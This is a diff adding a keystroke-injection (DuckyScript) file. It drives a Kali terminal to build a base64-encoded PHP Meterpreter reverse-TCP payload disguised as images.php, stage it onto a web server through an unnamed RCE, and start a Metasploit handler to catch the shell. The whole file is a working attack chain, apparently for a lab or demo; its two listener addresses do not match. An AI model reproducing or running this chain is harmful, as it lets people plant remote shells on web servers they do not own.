@@ -1,0 +1,67 @@
+REM Connect to the Kali VM prior to execution of this!
+DELAY 3000
+ALT F2
+DELAY 500
+STRING qterminal
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+STRING #[INFO] Hello, let's setup the webserver exploitation ^_^
+DELAY 1000
+ENTER
+ENTER
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING cd /home/parallels/Documents/targets/acme/
+DELAY 500
+ENTER
+DELAY 500
+STRING /bin/echo '<?PHP' > images.php
+ENTER
+DELAY 500
+STRING /usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=10.211.55.4 -e php/base64 -f raw  >> images.php
+DELAY 500
+ENTER
+DELAY 10000
+STRING /bin/echo '?>' >> images.php
+DELAY 500
+ENTER
+DELAY 500
+STRING #[INFO] Ok, we have setup the php meterpreter payload now we need to get this on the webserver
+DELAY 500
+ENTER
+DELAY 500
+STRING #[INFO] We just so happen to know of an existing RCE vulnerability on the site so let's use that :)
+DELAY 500
+ENTER
+STRING #[INFO] OK you asked for it ... here we go...
+ENTER
+DELAY 5000
+STRING ./stage.sh
+DELAY 500
+ENTER
+DELAY 5000
+STRING /usr/bin/msfconsole
+DELAY 500
+ENTER
+DELAY 20000
+STRING use multi/handler
+DELAY 500
+ENTER
+DELAY 2000
+STRING set PAYLOAD php/meterpreter/reverse_tcp
+DELAY 500
+ENTER
+DELAY 1000
+STRING set LHOST 10.211.5.4
+DELAY 500
+ENTER
+DELAY 1000
+STRING exploit
+DELAY 500
+ENTER
